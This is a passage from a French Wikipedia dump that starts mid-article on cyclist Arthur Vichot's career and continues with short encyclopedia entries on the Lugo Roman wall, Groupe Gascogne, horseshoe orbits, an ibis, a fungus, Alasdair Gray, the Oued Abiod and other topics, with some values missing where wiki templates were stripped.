Pour 2016, Vichot a comme objectif de remporter des victoires et ce le plus rapidement possible et cible particulièrement le championnat de France sur route qui se dispute à Vesoul près de son domicile. Commençant sa saison par le Grand Prix d'ouverture La Marseillaise, il y est septième. Il est ensuite en février cinquième de l'Étoile de Bessèges, avec un podium d'étape, puis septième du Trofeo Laigueglia. Lors de sa course suivante, le Tour du Haut-Var, il est deuxième de la première étape derrière Tom-Jelte Slagter. Le lendemain, il gagne la deuxième étape. Slagter étant distancé au préalable, sa victoire permet à Vichot de remporter l'épreuve varoise. Il s'agit de la de l'équipe FDJ en 20 ans d'existence. Vichot considère cette victoire comme . La semaine suivante, il est troisième de la Drôme Classic. Attendu sur Paris-Nice pour cibler une victoire d'étape, il abandonne en raison d'une maladie au cours de la troisième étape. Dix-huitième de Milan-San Remo remporté par son coéquipier Arnaud Démare, Vichot dispute ensuite le Tour du Pays basque avant les classiques ardennaises où il est le chef de file de sa formation. Son meilleur résultat sur ces courses, où il est gêné par une rhinopharyngite et selon lui par les conséquences du cytomégalovirus de 2015, est une dix-neuvième place lors de l'Amstel Gold Race&lt;ref name="est 24/05/2016"&gt;.&lt;/ref&gt;.
De retour à la compétition un mois plus tard après un stage de préparation au Tour de France en montagne autour de Thibaut Pinot, Vichot est troisième du Grand Prix de Plumelec-Morbihan puis deuxième des Boucles de l'Aulne, deux courses remportées par Samuel Dumoulin. Après le Critérium du Dauphiné, Vichot remporte à Vesoul le championnat de France sur route, le deuxième de sa carrière après 2013. Sur un tracé sélectif, et étant mentionné parmi les favoris pour la victoire, il bénéficie du travail collectif de la formation FDJ et fait partie de l'échappée à trois décisive. Il s'impose au sprint devant Tony Gallopin et Alexis Vuillermoz et considère ce titre comme étant la plus importante victoire de sa carrière. Sélectionné pour le Tour de France, il est présent - comme l'ensemble de ses coéquipiers - en tant que soutien de Thibaut Pinot pour le classement général. Pinot perd cependant rapidement toute chance au classement général et ne prend pas le départ de la treizième étape. Vichot se classe de son côté à Paris. Durant ce Tour de France, son contrat avec FDJ est étendu jusqu'en fin d'année 2018. Au début du mois d'août, un choc avec une voiture durant un entraînement lui provoque une fracture d'une clavicule traitée chirurgicalement ce qui le prive de participation aux Grands Prix de Québec et Montréal. Quelques jours plus tard le coureur annonce sur le réseau social Facebook qu'il met un terme à sa saison pour mieux préparer 2017.
Troisième victoire dans le Tour du Haut-Var (2017).
En 2017, Arthur Vichot, un des trois chefs de file de sa formation avec Arnaud Démare et Thibaut Pinot, a comme objectif d'être performant sur les courses de l'UCI World Tour et notamment les classiques ardennaises. Il remporte sa première victoire de la saison dès sa course de reprise, le Grand Prix La Marseillaise. Une grippe l'oblige cependant à abandonner au cours de l'Étoile de Bessèges dans les jours qui suivent. Pour son retour, il est septième du Trofeo Laigueglia. Deuxième puis troisième des deux étapes du Tour du Haut-Var, cette régularité permet à Vichot de remporter cette course pour la troisième fois, rejoignant ainsi Joop Zoetemelk comme étant le cycliste le plus titré sur cette épreuve. Vichot conclut février par une sixième place sur la Classic Sud Ardèche puis le lendemain une deuxième place lors de la Drôme Classic. En mars, Vichot est troisième des deux dernières étapes du Tour de Catalogne. Attendu sur le Circuit de la Sarthe, il y obtient plusieurs places d'honneur sur des étapes et se classe deuxième du classement général final. Sur les Ardennaises son meilleur résultat est une place lors de l'Amstel Gold Race. Quatrième du Grand Prix de Plumelec-Morbihan en mai, il perd logiquement son titre de champion de France sur route. Sur un profil de course favorable à un sprint, il joue un rôle d'équipier pour Arnaud Démare qui s'impose devant Nacer Bouhanni.
Présent sur le Tour de France, il y seconde Thibaut Pinot qui vise une victoire d'étape. Après une première chute au cours de la dixième étape, Vichot récidive le lendemain. Cette chute, qui lui cause une contusion du cartilage rotulien du genou droit, le contraint à l'abandon deux jours plus tard. En octobre, n'ayant pas repris la compétition, il subit une arthroscopie du genou droit, qui fait suite à des séquelles de cicatrisation causées par sa chute sur le Tour de France. Cinq semaines d'arrêt sont nécessaires après cette intervention pour pouvoir recommencer l'entraînement.
Victoire au Tour de l'Ain (2018).
Arthur Vichot participe en janvier au stage de pré-saison de son équipe à Calpe. Cependant, en raison de sa convalescence après son opération chirurgicale d'octobre 2017, il reprend la compétition plus tard que les années précédentes, à la fin du mois de février lors des Boucles Drôme-Ardèche. Équipier pour David Gaudu lors de la Classic de l'Ardèche, il est chef de file de son équipe le lendemain sur la Drôme Classic dont il se classe cinquième à 1 minute 10 secondes du lauréat Lilian Calmejane. Il subit une chute, en apparence bénigne, au cours de la première étape du Tour de Catalogne. Il finit l'étape avant d'abandonner durant la sixième étape. Des examens mettent en évidence que cette chute lui a causé une fracture à la troisième vertèbre lombaire.
Après un stage d'entraînement en montagne, Arthur Vichot fait son retour à la compétition sur le Tour de l'Ain où il est chef de file de sa formation avec David Gaudu. Deuxième de la deuxième étape, il s'impose pour la première fois lors d'une arrivée au sommet d'un col lors de la dernière étape qui se termine par l'ascension du col de la Faucille, ce qui lui permet de remporter le classement général de l'épreuve. Il enchaîne par une quatrième place au Grand Prix de Plumelec-Morbihan puis une deuxième place derrière Kevin Le Cunff sur les Boucles de l'Aulne. Sur cette course, il considère avoir fait une dans sa gestion de l'arrivée. Présent sur le Tour de Suisse, il tente tout d'abord de viser une victoire d'étape en attaquant dans les derniers kilomètres des deux premières étapes en ligne, sans succès. Il décide ensuite de se tester par rapport aux coureurs visant le classement général dans l'optique de progresser en montagne et obtient finalement la dixième place de l'épreuve, un classement qu'il qualifie d' et d'.
Le juillet, une attaque de Vichot à de l'arrivée décante la course en ligne du championnat de France sur route. Les coureurs de Groupama-FDJ sont en surnombre et en profitent. Dans le final, alors que Vichot est atteint de crampes, son coéquipier Anthony Roux s'impose et remporte le troisième titre consécutif pour sa formation. Vichot est ensuite présent sur le Tour de France pour y viser une victoire d'étape, un objectif qu'il n'atteint pas. Sur la fin de sa saison, qui est consacrée à des courses d'un jour, son meilleur résultat est une septième place sur le Grand Prix cycliste de Québec.
Dernières saisons avec Vital Concept-B&amp;B Hotels (2019-2020).
Arthur Vichot rejoint l'équipe continentale professionnelle Vital Concept-B&amp;B Hotels à compter de 2019 pour deux saisons avec l'ambition de &lt;ref name="velo101 14/08/18"&gt;.&lt;/ref&gt;. Son transfert est annoncé en août 2018. Il évoque alors comme motivation à ce changement une volonté de dans une équipe dont il est un des chefs de file annoncés avec Bryan Coquard et Pierre Rolland. Comme l'ensemble de ses coéquipiers et des salariés de son équipe, il commence sa préparation hivernale par un stage commando en novembre 2018. Il commence la compétition sous ses nouvelles couleurs lors du Grand Prix La Marseillaise (). Il enchaîne par le Tour de la Provence puis le Tour du Haut-Var où il se retrouve échappé avec deux de ses coéquipiers, Cyril Gautier et Pierre Rolland, lors de la deuxième étape. Il est ensuite sixième de la Drôme Classic. En mars, il est retenu pour prendre part à Paris-Nice où, en difficulté tout au long de la semaine, il abandonne lors de la septième étape. D'autres abandons suivent sur la Classic Loire-Atlantique, la Volta Limburg Classic puis lors de la quatrième étape du Circuit de la Sarthe. Engagé sur la Flèche brabançonne le 17 avril, il est non-partant et finalement mis au repos complet après lui avoir diagnostiqué une infection virale. Il reprend la compétition deux mois plus tard à l'occasion du Mont Ventoux Dénivelé Challenge où il abandonne. Cette situation se reproduit sur toutes les autres courses qu'il dispute ensuite, que ce soit la semaine suivante sur la Route d'Occitanie, le 31 juillet sur le Circuit de Getxo et enfin le 18 août sur la Polynormande. Vichot annonce la fin de sa saison dès la fin du mois d'août. En l'analysant, il la qualifie de , signalant une méforme apparente dès le stage de pré-saison de janvier, celle-ci augmentant alors progressivement tout en lui permettant ponctuellement de courir en utilisant son potentiel, notamment lors de la Drôme Classic. Il déclare en 2020 considérer que ses symptômes ont commencé dès septembre 2018 après le Grand Prix cycliste de Québec.
Après cette saison difficile, Arthur Vichot vise un retour en forme en 2020 à compter du mois d'avril. Sa saison 2020 commence par un abandon lors du Grand Prix La Marseillaise. Neuvième ensuite de la première étape de l'Etoile de Bessèges, il se classe treizième du classement général de cette épreuve. Deux semaines plus tard, malade comme plusieurs de ses coéquipiers, il abandonne au cours de la première étape du Tour des Alpes-Maritimes et du Var. À partir de mi-mars les courses sont suspendues ou annulées en raison de la pandémie de Covid-19. Toujours en méforme, le contexte sanitaire empêche Vichot de pouvoir subir des examens médicaux planifiés à Bruxelles dans une clinique spécialisée. Au cours de la vague épidémique, Vichot donne un de ses maillots de champion de France en vue d'une vente aux enchères permettant d'obtenir des équipements de protection pour le personnel du groupe hospitalier de Dinan, Saint-Malo, Cancale. En juin, son équipe annonce qu'il n'est pas en mesure de reprendre la compétition, toujours en raison du problème viral non identifié qui a perturbé sa précédente saison. En août, le médecin de son équipe annonce que Vichot est atteint d'un syndrome de surentraînement. Ce syndrome expliquerait les problèmes physiques de Vichot depuis son arrivée dans l'équipe Vital Concept-B&amp;B Hotels et nécessite au préalable en vue d'une récupération un arrêt complet de plusieurs mois de toute activité physique. Son contrat n'étant pas prolongé en fin de saison et n'ayant pas de perspective de retrouver son niveau physique antérieur, il annonce mettre un terme à sa carrière professionnelle le , jour de ses 32 ans. Il déclare écarter une reconversion au sein du milieu du sport cycliste.
Style et caractéristiques.
Arthur Vichot a un profil de puncheur capable selon l'entraîneur de la FDJ Frédéric Grappe de . Il a également des aptitudes au sprint. Vichot déclare avoir comme rêve les classiques ardennaises, particulièrement Liège-Bastogne-Liège, et le championnat du monde sur route. Marc Madiot, son directeur sportif à la FDJ, le voit également potentiellement à l'aise lors des classiques ardennaises et le classe comme , qui n'a pas l'occasion de gagner régulièrement mais qui est capable de saisir une occasion qui se présente à lui. Il souligne également les aptitudes tactiques de Vichot, notamment son placement et son . Adepte des courses en circuit, il apprécie des courses comme le Grand Prix de Plouay ou les Grands Prix de Québec et Montréal ainsi que des courses vallonnées en ligne. Il considère en revanche qu'une course comme le Tour de Lombardie est trop difficile pour lui. Vichot préfère les épreuves disputées par beau temps.
Sur les courses qui correspondent à ses caractéristiques, Vichot est régulièrement chef de file de l'équipe FDJ. Il devient également une tête d'affiche de cette formation, aux côtés du grimpeur Thibaut Pinot et du sprinteur Arnaud Démare. Il est également un des coureurs les plus importants de l'équipe Vital Concept-B&amp;B Hotels lorsqu'il la rejoint, en compagnie du grimpeur Pierre Rolland et surtout du sprinteur Bryan Coquard. Sur d'autres épreuves telles que les courses par étapes montagneuses, il effectue un rôle d'équipier notamment pour Pinot à la FDJ.
Vichot considère sa pratique du cyclisme en tant que professionnel davantage comme un métier, dans lequel il déclare s'investir à 100 %, qu'une passion. Attentif à dissocier vie personnelle et vie professionnelle, la plupart de ses amis n'a ainsi aucun rapport avec ce sport, à l'exception notable de Thibaut Pinot ou Anthony Roux. Coureur aimant s'entraîner avec assiduité, calme en dehors de sa pratique sportive et en course, il est considéré par Jérôme Pineau, son directeur sportif chez Vital Concept-B&amp;B Hotels, comme étant très .
Palmarès et classements mondiaux.
Résultats sur les grands tours.
Tour de France.
7 participations
Tour d'Espagne.
1 participation
Principales classiques et championnats du monde.
Le tableau suivant présente les résultats d'Arthur Vichot lors des classiques de l'UCI World Tour (ex-ProTour) auxquelles il a participé ainsi qu'aux championnats du monde.
Classements mondiaux.
Arthur Vichot apparaît pour la première fois dans un classement de l'UCI en 2008. Il s'agit du classement continental de l'Europe Tour où il est . Son meilleur résultat au niveau mondial est une place sur l'UCI World Tour 2014. Il obtient son meilleur classement continental en 2017 en étant de l'Europe Tour.
Légende : nc = non classé
Bibliographie.
Arthur Vichot réalise les préfaces des éditions 2013 et 2016 du "Grand livre du cyclisme français" grâce à son titre de champion de France sur route.
Filmographie.
Arthur Vichot ainsi que Steve Chainel sont l'objet d'un documentaire intitulé "Le prix de l'échappée" diffusé en sur France 2 et réalisé par Pierre-Henri Menthéour, Patrick Chassé, Isabelle Hostalery, Hélène Risacher et Anthony Santoro.

</doc>
<doc id="3214639" url="https://fr.wikipedia.org/wiki?curid=3214639" title="Muraille de Lugo">
Muraille de Lugo

La muraille de Lugo est une fortification militaire de la province romaine de Gallaecia. Sa construction a certainement débuté en 260, lorsque "Lucus Augusti" (Lugo) est devenu un centre important de communication et de commerce de la Gallaecia romaine, et s'est terminée sous Constantin. Cette muraille romaine entoure le centre historique de la ville de Lugo (Espagne), elle est très bien conservée, intégrée au cours des siècles à l'urbanisation de la ville, et avec quelques ajouts, elle garde en grande partie son aspect d'origine.
Le mur, avec ses 85 tours massives, s'étend sur une longueur de 2 266 m, est percé de dix portes. On peut le parcourir à pied sur toute sa longueur, son chemin de ronde fait office de promenade. 
La muraille a été déclarée bien d'intérêt culturel en Espagne en 1921. Elle est inscrite depuis le sur la liste du patrimoine mondial de l'Unesco.
Le , la muraille romaine de Lugo a été jumelée avec la Grande Muraille de Chine par le maire de Lugo, Xosé Clemente López Orozco et l'ambassadeur de Chine, Qui Xiaoqi.
Description.
L'enceinte romaine de l'ancienne "Lucus Augusti" est la mieux conservée de la péninsule ibérique. Elle n'a que peu changé en ses 17 siècles d'existence, gardant son aspect d'origine, conforme au modèle du traité d'architecture de Vitruve.
Dimensions.
Le périmètre de la muraille, en forme d'ellipse imparfaite, est de 2 117 mètres. La muraille enserre une superficie d'environ 34 hectares. La largeur du chemin de ronde varie entre 4,5 et 7 mètres. Le fossé qui entoure la muraille pouvait être rempli d'eau en cas de danger. 
À l'origine la muraille a été construite avec 85 tours dont 71 ont été conservées, soixante de forme ronde et onze quadrangulaires, qui avaient une fonction défensive. Leur hauteur varie de 8 à 16 m. Une des tours, qui porte le nom de "Mosqueira", a conservé toute sa hauteur et ses deux fenêtres en plein cintre de 1,15 m de large et 1,43 m de haut. Aux cinq portes de la construction romaine, il a été ajouté par la suite cinq nouvelles portes.
Matériaux.
Les matériaux de construction sont principalement du granite et des dalles d'ardoise, qui forment le parement. L'intérieur du mur est rempli d'un mortier composé de terre, de pierres et de galets, matériaux abondants dans la région.
Les portes.
Les cinq portes romaines :
Les cinq portes modernes :
Conservation.
Depuis soixante ans environ le travail le plus important de restauration a commencé en 1972 lorsque a été entreprise la démolition des bâtiments qui prenaient appui sur les remparts.
La muraille se détériore dans certaines zones, soit par une prolifération végétale "sauvage", soit par du vandalisme lié aux constructions avoisinantes, soit également par du vandalisme simple, par exemple sur les luminaires. La ville de Lugo et le gouvernement autonome de la Galice, propriétaire du monument, se renvoient la responsabilité de la maintenance globale du monument. Le gouvernement autonome a élaboré un projet de plan de maintenance et conservation sur quatre ans, prévu pour débuter en . Ce plan envisageait un cofinancement avec le Ministère de la Culture espagnol, la province de Lugo et la ville de Lugo. Le Journal Officiel de la Galice ("DOG"), a annoncé le la résolution du pour la publication d'un avis d'appel d'offres pour les travaux de maintenance du rempart romain de Lugo, cofinancé par le Fonds européen de développement économique et régional dans le cadre du programme opérationnel FEDER 2007/2013 .

</doc>
<doc id="3214644" url="https://fr.wikipedia.org/wiki?curid=3214644" title="Groupe Gascogne">
Groupe Gascogne

Gascogne (aussi appelé Groupe Gascogne) est une entreprise industrielle landaise spécialisée dans la fabrication de papiers et d'emballages. Elle est cotée à la Bourse de Paris.
Créé en 1925 au cœur de la forêt des Landes, Gascogne est aujourd'hui un groupe industriel intégré dans l’ensemble de la chaîne Bois-Papier-Emballage.
Premier opérateur multi-spécialiste de la valorisation du bois en France, le groupe landais est aussi le 1er producteur mondial de papier kraft naturel frictionné, le 3ème producteur européen de sacs industriels et grand public, et parmi les principaux fabricants européens de complexes multicouches d’emballage et de protection, notamment dans le secteur alimentaire. Il a réalisé 411 millions d’euros de chiffre d’affaires en 2023 et emploie environ 1 375 personnes.
Fin 2018, Gascogne dispose de 16 sites de production dans le monde.
Histoire.
Fondation en 1925.
Voir article détaillé : Gascogne PapierL'entreprise "Papeteries de Gascogne" est fondée en 1925 par des propriétaires forestiers désireux de valoriser leur bois en fabriquant du papier kraft et des sacs d’emballage. Ce groupement est réalisé à l'initiative de Emmanuel Delest, adjoint au maire de Mimizan et de son beau-frère Alphonse Bacon, notaire à Labouheyre. Le sénateur Cadilhon joue aussi un rôle important. Les banques régionales apportent un soutien décisif. Les fondateurs veulent produire du papier kraft, comme cela se fait déjà aux États-Unis et au Canada. L'activité débute en mai 1925 à Mimizan.
Grave crise financière de 2012-2014.
En juillet 2012, le Groupe Gascogne passe près du dépôt de bilan. Durement touché comme d'autres par la crise de la papeterie, il accuse un lourd endettement. L’actionnaire principal de l’entreprise à l’origine détenue par des Landais est la holding financière EEM (Électricités et Eaux de Madagascar) qui se révèle un mauvais gestionnaire de la crise.
Son sauvetage se réalise en 2014 grâce à l’arrivée dans son capital de deux industriels landais, Biolandes, entreprise familiale, créée par Dominique Coutière, basée à Le Sen, produisant des huiles essentielles et DRT (Dérivés Résiniques et Terpéniques) basée à Dax (usines à Castets, Lesperon et Vielle-Saint-Girons) spécialisée dans les dérivés du pin (chimie, parfumerie et cosmétique). Elles entrent au capital de Gascogne avec l'aide de l'État, à travers la Banque publique d'investissement (BpiFrance), et du groupe Crédit Agricole par l'intermédiaire de la holding ATTIS 2.
La sortie de cette situation critique a été suivie de près par le Comité interministériel de restructuration industrielle (CIRI). Le projet industriel et commercial, outre la restructuration de la dette, investit dans une chaudière biomasse pour alléger les coûts énergétiques et dans une ligne de fabrication de "pellets" (granulés de bois) ainsi que dans une ligne de coupe-aboutage.
Recomposition de l'actionnariat en 2023.
À la suite de la décision de non-lieu au dépôt obligatoire d’un projet d’offre publique visant les actions de Gascogne prise par l'AMF, DRT et Bpifrance ont cédé le 15 mars 2023 l’intégralité de leur participation respective au sein d’Attis 2, au profit de Biolandes Technologies, d’IDIA Capital Investissement, et de Crédit Mutuel Equity, nouvel actionnaire d’Attis 2. La recomposition actionnariale n’a aucun impact sur la participation directe d’Attis 2 dans Gascogne, qui reste inchangée et ne remet pas en cause la cotation du titre Gascogne sur le marché Euronext Growth Paris.
Augmentation de capital de 2024.
Gascogne annonce la réalisation de son augmentation de capital avec maintien du droit préférentiel de souscription (DPS) des actionnaires d’un montant brut de 20 937 215€.
La totalité du produit de l’Augmentation de Capital renforcera les fonds propres de Gascogne et permettra de financer une partie du projet d’acquisition de la nouvelle machine à papier sur le site de Mimizan, à hauteur de 21 M€, dont 10 M€ ont déjà été apportés par Attis 2 sous forme d’avance en compte courant fin 2023 (et seront convertis en capital lors de cette Augmentation de Capital) et le solde de 11 M€ qui sera apporté par la réalisation de l’Augmentation de Capital.
Cette nouvelle machine à papier remplacera 3 des 4 machines à papier existantes. Outre l’acquisition d’une nouvelle machine à papier, les fonds de l’Augmentation de Capital seront affectés au financement de la construction d’un bâtiment destiné à recevoir la nouvelle machine à papier, et d’un bâtiment logistique pour accueillir des équipements neufs de découpe et d’emballage des bobines de papier ainsi qu’une zone de stockage.
A l'issue de cette augmentation de capital le concert d'actionnaires composé d'ATTIS 2 SAS et de Biolandes Technologies représente 86,11% du capital.
Actionnaires.
Mise à jour .
Présentation.
Parmi ses filiales réorganisées en deux divisions 2014, on trouve :
La production se répartit en 16 sites : 
Données financières.
Chiffre d'affaires 2023 : 411,2 millions d'euros
Résultat net consolidé 2023 : 9,6 millions d'euros

</doc>
<doc id="3214649" url="https://fr.wikipedia.org/wiki?curid=3214649" title="Orbite en fer à cheval">
Orbite en fer à cheval

L'orbite en fer à cheval d'un objet céleste est la trajectoire apparente que semble décrire cet objet lorsqu'il est observé depuis un autre corps céleste avec lequel il coorbite.
Description.
Soit deux objets secondaires B et C, en révolution autour d'un même objet primaire A, selon un mouvement coorbital. Lorsque C est situé à proximité du , ou du système A-B, l'orbite de C autour de A semble décrire, lorsqu'elle est observée depuis B, un fer à cheval.
Un corps céleste possédant une orbite en fer à cheval est en réalité en coordination avec une planète, dite planète mère, et un troisième astre (souvent le Soleil). C'est un des trois types d'objets co-orbitaux avec les troyens et les quasi-satellites.
C'est le cas de (3753) Cruithne et de .
Stabilité et transitions entre orbite en fer à cheval et quasi-satellite.
Certains astéroïdes ayant une orbite en fer à cheval parviennent, pour quelque temps (souvent quelques siècles) à se maintenir sur des orbites de type quasi-satellite. Au-delà, ils reprendront une orbite en fer à cheval (d'une manière analogue à Cruithne) et il est impossible de dire avec certitude s'ils redeviendront des quasi-satellites au bout de quelques siècles.
Un astéroïde dont l'orbite est suffisamment inclinée et/ou excentrique est susceptible de passer d'un mouvement de type quasi-satellite (QS) à un mouvement de type fer à cheval et inversement. L'animation ci-contre montre le cas de l'astéroïde , qui va traverser deux de ces transitions dans les prochains siècles : le mouvement actuel est de type fer à cheval, puis l’astéroïde deviendra un quasi-satellite de la Terre vers l'année 2190 et reprendra son mouvement de fer à cheval.
Liste.
Terre.
Dans leur article de 2020, Murat Kaplan et Sergen Cengiz répertorient 22 objets co-orbitaux de la Terre, dont 16 sur une orbite en fer à cheval :
Satellites de Saturne.
Deux satellites naturels de Saturne, à savoir Janus et Épiméthée, sont sur des orbites en fer à cheval l'un par rapport à l'autre.

</doc>
<doc id="3214650" url="https://fr.wikipedia.org/wiki?curid=3214650" title="Ibis des Andes">
Ibis des Andes

L'Ibis des Andes (Theristicus branickii) est une espèce d'oiseaux de la famille des Threskiornithidae.
Répartition.
Cet oiseau vit en Équateur et à travers l'Altiplano.

</doc>
<doc id="3214653" url="https://fr.wikipedia.org/wiki?curid=3214653" title="Dédalée du chêne">
Dédalée du chêne

Daedalea quercina, la Dédalée du chêne ou le Polypore du chêne, est une espèce de champignons basidiomycètes de la famille des "Fomitopsidaceae".
Écologie.
Cette espèce vient toute l'année sur les troncs des chênes, comme son nom l'indique, mais aussi occasionnellement sur d'autres feuillus : châtaigniers, hêtres, noyers notamment. Il est rare sur les conifères. Son mycélium cause une pourriture brune chez son hôte.
Utilisation.
Coriace et de ce fait immangeable, la dédalée du chêne reste un champignon comestible si on l'utilise pour parfumer un potage.
Il contient également du quercinol, aux propriétés anti-inflammatoires.
Espèces proches et confusions possibles.
La dédalée du chêne se reconnait aisément à son habitat, à son profil en console aplatie et surtout à son hyménium labyrinthique qui évoque certains madrépores. C'est une particularité que l'on retrouve toutefois chez d'autres Polyporales, tels les "Lenzites" ou les "Daedaleopsis ", et aussi chez les Gloeophyllales.

</doc>
<doc id="3214654" url="https://fr.wikipedia.org/wiki?curid=3214654" title="Pédopornographique">
Pédopornographique



</doc>
<doc id="3214656" url="https://fr.wikipedia.org/wiki?curid=3214656" title="Alasdair Gray">
Alasdair Gray

Alasdair Gray, né le à Glasgow et mort dans la même ville le , est un romancier, poète, dramaturge et peintre écossais.
Son premier roman, "Lanark" fut publié en 1981 et connut un immense succès critique.
Le critique André Clavel le décrit comme « un illusionniste écossais aussi insaisissable que le monstre du Loch Ness». Avec l'autodérision qui le caractérise, Alasdair Gray se définit lui-même ainsi : .
Il est également l'auteur du roman "Pauvres Créatures" ("Poor Things"), publié en 1992, et adapté au cinéma en 2023 sous le titre homonyme.
Biographie.
L'enfance d'Alasdair Gray est marquée par son évacuation à la campagne durant les bombardements de la Seconde Guerre mondiale, en 1940, puis en 1942. Il affirme que ces expériences ont compté dans sa carrière et son œuvre.
Il étudie (1952-1957) puis enseigne (1958-1962) à la '. C'est au cours de ses études qu’il commence à travailler à son roman "Lanark". En 1954, il peint sa première fresque ' (") au 8 Belmont Crescent, Hillhead à Glasgow.
Après l'obtention de son diplôme, Alasdair Gray devient metteur en scène et continue de peindre portraits et fresques. Ses premières pièces de théâtre sont diffusées à la radio et à la télévision en 1968.
En 2001, il se porte candidat au rectorat de l'université de Glasgow avec l'étiquette du ". Cet engagement concret rappelle que l'auteur est nationaliste écossais, le GUSNA étant un acteur historique de l'indépendantisme écossais qui donna naissance aux principaux partis modernes. Un mur du bâtiment du Parlement écossais reprend d’ailleurs une citation célèbre de Gray : ().
Il meurt le , lendemain de ses 85 ans à Glasgow.
Œuvre.
L'œuvre romanesque d'Alasdair Gray tient à la fois du réalisme, du fantastique et de la science-fiction. L'auteur se démarque par une utilisation originale de la typographie et de ses propres illustrations. Il produit de nombreuses peintures murales et tableaux. Deux de ses fresques les plus remarquables sont visibles dans le restaurant Ubiquitous Chip et sur le plafond mural de l'auditorium Oran Mor à Glasgow.
Ses écrits politiques sont engagés vers le socialisme et le nationalisme écossais.
Au début des années 1970, Alasdair Gray participe à des émissions de radio et de télé, "Lanark" est en cours d’écriture, il est particulièrement admiratif du travail du poète Tom Leonard et du romancier James Kelman. Avec eux, il fonde l'École de Glasgow qui regroupe des auteurs qui bousculent les usages littéraires et linguistiques de la littérature écossaise, britannique et même mondiale.
Gray s'inscrit dans une tradition écossaise de réalisme social, dans la lignée de , mais la renouvelle surtout au niveau de la forme même : l'humour, et en particulier l'autodérision, est omniprésent dans ses écrits. Bien que de formation universitaire et intellectuelle de haut niveau, il se réclame d'une « culture populaire fondée sur le plaisir du lecteur » . Il rompt ainsi avec « la narration linéaire traditionnelle, le phrasé bourgeois et les descriptions pudibondes ».
Le nationalisme écossais est également présent dans sa fiction, comme dans "Pauvres créatures" ("Poor Things") publié en 1992, qui annonce la naissance d’une « Lady Scotland », symbole de la prise de conscience politique d'une Nouvelle-Écosse. Quittant Glasgow pour découvrir le monde, le personnage principal, Bella Baxter se voit expliquer la rationalité supposée du capitalisme et du colonialisme par un homme d'affaires anglais. Durant ses voyages, elle remarque que les personnages les plus « "comiques et laids" » brossés dans les cartoons des magazines de la haute-société sont « "écossais, irlandais, étrangers, de pauvres serviteurs, des gens riches qui étaient pauvres jusqu’à récemment, de petits hommes, de vieilles femmes non-mariées ou des socialistes." » "Pauvres créatures" peut être lu comme une critique de l’establishment britannique, ou plus précisément anglais. Selon le magazine écossais "The Skinny", situer l’action du roman dans l’Ecosse victorienne est essentiel à la compréhension du personnage de Bella, qui peut être vu comme une métaphore de la nation celtique : « "à la fois vieille et jeune - dépouillée de son histoire et violemment forcée de communiquer dans une langue peu familière. »" Au début du livre est inclus un portrait de Bella Baxter intitulé Bella Caledonia, le nom latin du pays de Walter Scott. En 2007, cette image et son titre inspiraient la création d’un magazine indépendantiste du même nom. Plus tard, Alasdair Gray offrit alors de retravailler cette représentation en y ajoutant un chardon. Ce roman fait l'objet d'un adaptation cinématographique en 2023 sous le titre homonyme.
En France, ce côté politique de l'œuvre est moins connu et les critiques littéraires retiennent surtout l'aspect novateur, avant-gardiste du génie littéraire, comme dans son roman "Lanark".
« Lanark est un jeune peintre du Glasgow des années 1960-70. Frappé d’amnésie, il erre dans un monde en pleine décomposition et ne s'intéresse qu'à la lumière ; désespéré, il se suicide et reprend pied dans un univers de science-fiction où il devient thérapeute de dragons, retrouve une femme qu'il aime et découvre sa véritable identité. Au cours d'aventures étranges, il se trouve confronté à son créateur : l'écrivain... et négocie avec lui son destin ».

</doc>
<doc id="3214657" url="https://fr.wikipedia.org/wiki?curid=3214657" title="Oued Abiod">
Oued Abiod

Loued Abiod en chaoui : ⵉⵖⵣⵉⵔ ⴰⵎⴻⵍⵍⴰⵍ (Ighzir Amellal) : est un cours d'eau qui traverse le massif des Aurès au nord-est de l'Algérie ; il prend sa source à environ d'altitude
 près du Djebel Chélia, point culminant de l'Aurès (), et coule vers le Sahara (Biskra) selon un axe nord-est/sud-ouest.
Géologie.
La vallée de cet oued est une dépression synclinale soulevée au Pléistocène, où l'oued s'est enfoncé au fur et à mesure du soulèvement.
Géographie.
Partie supérieure du cours.
Ce cours d'eau prend naissance dans une région où prédomine la végétation méditerranéenne de montagne (cèdres, chênes verts), la pluviosité étant encore suffisante. Il traverse d'abord le Djebel Ichmoul.
Partie moyenne du cours.
Il coule entre le Djebel El Arezg à l'ouest, le Djebel Zellatou, puis le Djebel Ahmar Khaddou à l'est, dans une vallée encaissée parfois désignée comme « cañon de l'oued Abiod ».
Après avoir dépassé la ville d'Arris, l'oued s'enfonce dans les gorges de Tighanimine, longues de . Il est alors bordé d'une ancienne voie romaine ; une inscription gravée dans la roche indique qu'elle a été construite en 145 par un détachement syrien de la Quatrième Légion.
L'oued passe notamment par le village de Ghoufi (commune de Ghassira)], célèbre pour ses « balcons ».
À la sortie des gorges, le paysage de la vallée devient franchement désertique.
Partie inférieure du cours.
Plus au sud, l'oued traverse Baniane (commune de M'Chouneche), sort de la montagne dans la région de Biskra, puis l'eau se perd dans les sables du désert.

</doc>
<doc id="3214659" url="https://fr.wikipedia.org/wiki?curid=3214659" title="Strange Sensations">
Strange Sensations



</doc>
<doc id="3214665" url="https://fr.wikipedia.org/wiki?curid=3214665" title="Chong Tae-hyon">
Chong Tae-hyon

Chong Tae-hyon (né le à Gunsan, Corée du Sud) est un joueur sud-coréen de baseball qui joue avec les Lotte Giants de Pusan dans la ligue sud-coréenne de baseball.
Il a obtenu la médaille de bronze de baseball lors des jeux olympiques 2000 à Sydney et la médaille d'or de baseball lors des jeux olympiques 2008 à Pékin. Il a obtenu la à la Classique mondiale de baseball 2006.
Il est le stoppeur dans les Lotte Giants.

</doc>
<doc id="3214669" url="https://fr.wikipedia.org/wiki?curid=3214669" title="Vieux-Port - Hôtel de ville (métro de Marseille)">
Vieux-Port - Hôtel de ville (métro de Marseille)

La station Vieux-Port - Hôtel de ville est une station de la ligne 1 du métro de Marseille.
Histoire et localisation.
Cette station est située sur la ligne 1 du métro de Marseille, à une distance de du terminus "La Rose". La station se trouve dans le premier arrondissement de Marseille, au niveau du Quai des Belges. La station comporte trois accès.
La station a été inaugurée le , lors de la mise en service de la ligne 1.
Architecture.
Comme la plupart des stations bâties lors de la construction de la ligne, cette station est bâtie sur deux niveaux :
La station possède un quai unique, desservant les deux voies du métro. Les décorations murales sont une œuvre de Pierre-Alain Hubert.
En 2024, des ascenseurs ont été mis en service.
Correspondances RTM.
Un certain nombre de correspondances sont disponibles avec le réseau d'autobus de la RTM : 

</doc>
<doc id="3214676" url="https://fr.wikipedia.org/wiki?curid=3214676" title="Julien Delétraz">
Julien Delétraz

